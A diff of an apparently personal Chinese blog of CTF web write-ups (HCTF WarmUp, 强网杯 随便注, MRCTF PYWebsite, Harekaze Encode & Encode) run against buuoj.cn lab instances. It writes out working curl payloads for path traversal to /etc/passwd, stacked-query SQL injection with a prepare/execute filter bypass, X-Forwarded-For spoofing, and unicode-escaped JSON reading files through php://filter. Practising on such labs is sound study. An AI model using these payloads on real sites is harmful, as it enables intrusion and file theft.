@@ -11,9 +11,9 @@ date:   2020-04-18 20:00:38 +0800
 ## [HCTF 2018] WarmUp 1
 
 ```shell
-url='http://a762a799-746e-4549-beb3-a076fbfd409e.node3.buuoj.cn/'
+site='http://a762a799-746e-4549-beb3-a076fbfd409e.node3.buuoj.cn/'
 # 发现注释里有一个source.php 结果是一堆 entity encoding，先用 perl 处理一下
-curl $url'source.php' | perl -MHTML::Entities -pe 'decode_entities($_)' > source.php
+curl $site/source.php | perl -MHTML::Entities -pe 'decode_entities($_)' > source.php
 # 看下是什么编码？
 file source.php
 # source.php: ISO-8859 text, with very long lines
@@ -26,22 +26,22 @@ cp source.php source.html
 ./hctf_2018_warm_up_1_strip.py source.html > source.php
 
 # 发现有个hint.php
-curl $url'hint.php'
+curl $site/hint.php
 # flag not here, and flag in ffffllllaaaagggg
 
 # 尝试访问 ffffllllaaaagggg 未果
-curl $url'ffffllllaaaagggg'
-curl $url'source.php?file=ffffllllaaaagggg'
+curl $site/ffffllllaaaagggg
+curl $site/source.php?file=ffffllllaaaagggg
 # 不行
 ```
 谷歌说可以给参数插入问号`?`和连续多个父目录`..`，比如PHP会把 `hint.php?/../`之后的内容视为当前目录，这里的原理还没有完全弄清楚；可能源码截取"?"是在提示这个现象的？
 
 ```shell
 # 因为源码用了REQUEST，参数既可以从查询参数，也可以从表单中取得
-curl $url'source.php' -X POST -d 'file=hint.php?/../../../../etc/passwd'
-curl $url'source.php?file=hint.php?/../../../../etc/passwd'
+curl $site/source.php -X POST -d 'file=hint.php?/../../../../etc/passwd'
+curl $site/source.php?file=hint.php?/../../../../etc/passwd
 # 插入很多个父目录
-curl $url'source.php?file=hint.php?/../../../../../ffffllllaaaagggg'
+curl $site/source.php?file=hint.php?/../../../../../ffffllllaaaagggg
 ```
 
 ```python
@@ -64,25 +64,25 @@ with open(sys.argv[1], encoding='utf8') as f:
 ## [强网杯 2019]随便注 1
 
 ```shell
-url="http://91b13641-161f-4df8-9290-e2d26f5c5340.node3.buuoj.cn/?inject="
+site="http://91b13641-161f-4df8-9290-e2d26f5c5340.node3.buuoj.cn"
 # 有一个 inject 参数。发现是 PHP
-curl $url'1'
+curl $site/?inject=1
 
 # q("1' -- a")
 # 带上引号和注释，发现没有报错，原来的SQL应该是 'SELECT * FROM WHERE A=\''.$inject.'\' ... '
-curl $url'1%27%20--%20a'
+curl $site/?inject=1%27%20--%20a
 
 # q("1' order by 3 -- a")
 # 报错，表示有2列
-curl $url'1%27%20order%20by%203%20--%20a'
+curl $site/?inject=1%27%20order%20by%203%20--%20a
 
 # q("9' union select 1,2,3 -- a")
 # 不OK。下面的正则表达式表示关键字 select等，以及句号 . 被过滤掉了，大小写不能通过
 # return preg_match("/select|update|delete|drop|insert|where|\./i",$inject)
-curl $url'9%27%20union%20select%201%2C2%2C3%20--%20a'
+curl $site/?inject=9%27%20union%20select%201%2C2%2C3%20--%20a
 # error-based sqli 看用户名 root@localhost，数据库名 supersqli，版本 10.3.18-MariaDB
 # q("9' and extractvalue('',concat('~',user(),'~')) -- a")
-curl $url'9%27%20and%20extractvalue%28%27%27%2Cconcat%28%27%7E%27%2Cuser%28%29%2C%27%7E%27%29%29%20--%20a'
+curl $site/?inject=9%27%20and%20extractvalue%28%27%27%2Cconcat%28%27%7E%27%2Cuser%28%29%2C%27%7E%27%29%29%20--%20a
 ```
 
 止步于此了，挫折感满满啊'_'。谷歌说可以尝试看下是否可以注入多个SQL语句；另外 select 被过滤了不能用来查DB，但可以尝试 show 和 desc 。事后证明这个题目的源代码使用到了PHP [multi_query](https://zhuanlan.zhihu.com/p/78989602)，
@@ -91,15 +91,15 @@ curl $url'9%27%20and%20extractvalue%28%27%27%2Cconcat%28%27%7E%27%2Cuser%28%29%2
 # 看schema 
 # q("1';show databases#")
 # 这里也不需要短路，会直接显示所有表
-curl $url'1%27%3Bshow%20databases%23'
+curl $site/?inject=1%27%3Bshow%20databases%23
 # 看表
 # q("1';show tables#")
 # 有两个表，1919810931114514 和 words
-curl $url'9%27%3Bshow%20tables%23'
+curl $site/?inject=9%27%3Bshow%20tables%23
 # 看表结构
 # q("1'; desc `1919810931114514` #")
 # 有两列 flag 和 NO，答案就在这个表 
-curl $url'1%27%3B%20desc%20%601919810931114514%60%20%23'
+curl $site/?inject=1%27%3B%20desc%20%601919810931114514%60%20%23
 ```
 
 但是还是不清楚怎么把答案select出来。谷歌说还有一种叫做**预编译SQL**的操作，简单来说就是在允许执行多个SQL语句的情况下，先prepare拼接sql语句然后execute。谢天谢地没把from以及这几个关键字过滤掉。
@@ -107,10 +107,113 @@ curl $url'1%27%3B%20desc%20%601919810931114514%60%20%23'
 ```shell
 # q("1'; prepare stat from concat('sel', 'ect * from `1919810931114514`'); execute stat;#")
 # 有两列 flag 和 NO，答案就在这个表 
-curl $url'1%27%3B%20desc%20%601919810931114514%60%20%23'
+curl $site/?inject=1%27%3B%20desc%20%601919810931114514%60%20%23
 ```
 
-知乎有个[文章](https://zhuanlan.zhihu.com/p/78989602)表示，因为可以执行多个SQL语句，所以可以把答案所在表的名字和列名改成被注入的SQL语句的，让原来的sql语句直接把答案select出来，太厉害了。
+知乎[文章](https://zhuanlan.zhihu.com/p/78989602)表示，因为可以执行多个SQL语句，所以可以把答案所在表的名字和列名改成被注入的SQL语句的，让原来的sql语句直接把答案select出来，太厉害了。
+
+
+## [MRCTF2020]PYWebsite
+跟南邮题目[伪装者](http://chinalover.sinaapp.com/web4/xxx.php)是一类
+```shell
+site=http://node3.buuoj.cn:29631
+curl $site
+# 有一个flag.php
+curl $site/flag.php
+# 提示“验证逻辑是在后端的，除了购买者和我自己，没有人可以看到flag”
+# 划重点：自己
+curl $site/flag.php -H 'Client-Ip: 127.0.0.1'  # 不OK
+curl $site/flag.php -H 'X-Forwarded-For: 127.0.0.1'  # OK
+```
+## Harekaze CTF 2019: Encode & Encode
+
+```shell
+site=http://4bbdd3ac-3f3c-408a-8106-2a807cde3d21.node3.buuoj.cn
+curl $site
+curl $site/query.php
+curl $site/query.php -X POST -d '{"page":"flag"}'
+```
+源代码有个函数把一些关键字过滤掉。
+```php
+// Source
+function is_valid($str) {
+  $banword = [
+    // no path traversal
+    '\.\.',
+    // no stream wrapper
+    '(php|file|glob|data|tp|zip|zlib|phar):',
+    // no data exfiltration
+    'flag'
+  ];
+  $regexp = '/' . implode('|', $banword) . '/i';
+  if (preg_match($regexp, $str)) {
+    return false;
+  }
+  return true;
+}
+```
+
+无从下手╮（╯＿╰）╭。[谷歌](https://crdx.org/post/harekaze-ctf-2019-encode-and-encode)说这个题的关键在于校验方式存在缺陷：is_valid检查的是JSON字符串，然而file_get_contents使用的是经过JSON反序列化之后的内容；正常的做法应该是先反序列化，然后再使用is_valid。
+
+```php
+// Source
+$body = file_get_contents('php://input');
+$json = json_decode($body, true);
+
+if (is_valid($body) && isset($json) && isset($json['page'])) {
+  $page = $json['page'];
+  $content = file_get_contents($page);
+  if (!$content || !is_valid($content)) {
+    $content = "<p>not found</p>\n";
+  }
+} else {
+  $content = '<p>invalid request</p>';
+}
+```
+
+JSON标准规定所有解码器都要处理转义的字符序列（如下图所示）。尽管is_valid过滤原始参数中的关键字，但是如果关键字使用unicode码点进行转义，is_valid的作用就失效了
+
+![JSON Standard](https://crdx.org/res/harekaze-ctf-2019-encode-and-encode/string.gif)
+
+```python
+import json
+
+s='file:///etc/hosts'
+print(json.dumps(dict(page='%s')) % ''.join([f'\\u{hex(ord(i)).replace("x", "0")}' for i in s]))
+# {"page": "\u0066\u0069\u006c\u0065\u003a\u002f\u002f\u002f\u0065\u0074\u0063\u002f\u0068\u006f\u0073\u0074\u0073"}
+```
+
+```shell
+# OK {"content":"127.0.0.1\tlocalhost\n::1\tlocalhost ip6-localhost ip6-loopback\nfe00::0\tip6-localnet\nff00::0\tip6-mcastprefix\nff02::1\tip6-allnodes\nff02::2\tip6-allrouters\n174.0.59.166\t5ff83e563e21\n"}
+curl $site/query.php -X POST -d '{"page": "\u0066\u0069\u006c\u0065\u003a\u002f\u002f\u002f\u0065\u0074\u0063\u002f\u0068\u006f\u0073\u0074\u0073"}'
+```
+
+如果直接包含答案文件 `/flag`，最后源码会将答案过滤掉:
+```php
+// no data exfiltration!!!
+$content = preg_replace('/HarekazeCTF\{.+\}/i', 'HarekazeCTF{&lt;censored&gt;}', $content);
+echo json_encode(['content' => $content]);
+```
+这里可以运用南邮[文件包含](http://4.chinalover.sinaapp.com/web7/index.php)的方法，使用`php://filter`和base64编码绕过：
+
+```python
+s='php://filter/read=convert.base64-encode/resource=/flag'
+print(json.dumps(dict(page='%s')) % ''.join([f'\\u{hex(ord(i)).replace("x", "0")}' for i in s]))
+# {"page": "\u0070\u0068\u0070\u003a\u002f\u002f\u0066\u0069\u006c\u0074\u0065\u0072\u002f\u0072\u0065\u0061\u0064\u003d\u0063\u006f\u006e\u0076\u0065\u0072\u0074\u002e\u0062\u0061\u0073\u0065\u0036\u0034\u002d\u0065\u006e\u0063\u006f\u0064\u0065\u002f\u0072\u0065\u0073\u006f\u0075\u0072\u0063\u0065\u003d\u002f\u0066\u006c\u0061\u0067"}
+```
+
+```shell
+curl $site/query.php -X POST -d '{"page": "\u0070\u0068\u0070\u003a\u002f\u002f\u0066\u0069\u006c\u0074\u0065\u0072\u002f\u0072\u0065\u0061\u0064\u003d\u0063\u006f\u006e\u0076\u0065\u0072\u0074\u002e\u0062\u0061\u0073\u0065\u0036\u0034\u002d\u0065\u006e\u0063\u006f\u0064\u0065\u002f\u0072\u0065\u0073\u006f\u0075\u0072\u0063\u0065\u003d\u002f\u0066\u006c\u0061\u0067"}'
+# {"content":"ZmxhZ3sxODE3Zjk5MC05NjY1LTQzNmItYWVmZi03NzUyZmU0ZGM5YzB9Cg=="}
+```
+
+```python
+from base64 import b64encode as be, b64decode as bd
+
+print(bd('ZmxhZ3sxODE3Zjk5MC05NjY1LTQzNmItYWVmZi03NzUyZmU0ZGM5YzB9Cg==').decode())
+```
+
+
 
 
 # Notes
@@ -126,3 +229,6 @@ curl $url'1%27%3B%20desc%20%601919810931114514%60%20%23'
   - [Prepared statement](https://dev.mysql.com/doc/refman/8.0/en/sql-prepared-statements.html)
     - prepare; set; execute
   - `show databases/tables` and `desc`
+- http
+  - JSON
+    - escaped sequences
